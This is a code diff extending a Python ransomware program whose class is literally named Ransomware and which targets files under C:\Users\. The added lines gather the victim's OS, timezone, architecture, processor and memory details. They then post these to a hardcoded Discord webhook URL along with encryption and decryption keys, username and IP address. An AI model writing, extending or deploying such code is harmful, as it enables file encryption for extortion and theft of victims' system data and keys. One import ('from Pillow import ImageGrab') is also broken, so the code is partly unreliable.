@@ -16,13 +16,34 @@ from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QPushButton, QVBo
 from PyQt5.QtGui import QIcon
 from PyQt5.QtCore import Qt, QTimer, QObject, pyqtSignal, QThread
 import ctypes
+import platform
+from datetime import datetime
+import pytz
+import psutil
+import socket
+from Pillow import ImageGrab
+from datetime import datetime, timedelta
 
 # Initialize global variables
 SPI_SETDESKWALLPAPER = 0x0014
 btcAdd = ""
 email = ""
 discordWebhook = "https://discord.com/api/webhooks/1213226208494624768/LaW1E7j2183RtaOqqfttCaQGvnOhEvi13Uu80L_UHgAmFeNXhDbAU3X-BMIWht5IP3Rk"
+# Get operating system information
+os_info = f"Operating System: {platform.system()} {platform.version()}"
 
+# Get current timezone
+current_timezone = datetime.now(pytz.timezone('UTC')).astimezone().tzinfo
+timezone_info = f"Timezone: {current_timezone}"
+
+# Get system architecture
+architecture_info = f"System Architecture: {platform.architecture()}"
+
+# Get processor information
+processor_info = f"Processor: {platform.processor()}"
+
+# Get memory (RAM) information
+memory_info = f"Total Memory: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB"
 fileTypes = ['.txt']
 '''
 otherFileTypes = ['.exe', '.php', '.pl', '.7z', '.rar', '.m4a', '.wma', '.avi', '.wmv', '.csv', '.d3dbsp', '.sc2save',
@@ -70,6 +91,7 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
         self.threadpool = PyQt5.QtCore.QThreadPool()# creates an instance of Qthreadpool( manages pools of threads)
         self.randomId = self.rID(12)                # generates a randID 12 length using rID method
         self.encryptionPass = self.rSeed(32)        # generates random seed 32 length using rSeed
+        self.decryptionPass = self.rSeed(32)
         self.filePath = "C:\\Users\\"               # sets file path attribute 
         self.ip = ""                                # inits ip attribute to empty string 4 later
         self.userName = ""                          # inits userName attribute to empty string 4 later
@@ -121,11 +143,19 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
 
 
     # Send message to Discord Webhook with victim details 
+
     def sendMessage(self):
         try:
             self.getUserDetails()
         except Exception as e:
             print(f"Error getting user details for sending message: {e}")
+
+        os_info = f"Operating System: {platform.system()} {platform.version()}"
+        current_timezone = datetime.now(pytz.timezone('UTC')).astimezone().tzinfo
+        timezone_info = f"Timezone: {current_timezone}"
+        architecture_info = f"System Architecture: {platform.architecture()}"
+        processor_info = f"Processor: {platform.processor()}"
+        memory_info = f"Total Memory: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB"
 
         data = {
             "embeds": [
@@ -136,7 +166,12 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
                         f"```css\nENCRYPTION KEY: {self.encryptionPass}``` "
                         f"```css\nDECRYPTION KEY: {self.decryptionPass}``` "
                         f"```css\nUSERNAME: {self.userName}``` "
-                        f"```css\nIP: {self.ip}```"
+                        f"```css\nIP: {self.ip}``` "
+                        f"```css\n{os_info}``` "
+                        f"```css\n{timezone_info}``` "
+                        f"```css\n{architecture_info}``` "
+                        f"```css\n{processor_info}``` "
+                        f"```css\n{memory_info}```"
                     ),
                     "color": 13959168,
                     "thumbnail": {
@@ -154,6 +189,7 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
             r = requests.post(discordWebhook, json=data)
         except Exception as e:
             print(f"Error sending message to Discord webhook: {e}")
+
 
     # Generate random string for encryption password
     def rSeed(self, stringLength):
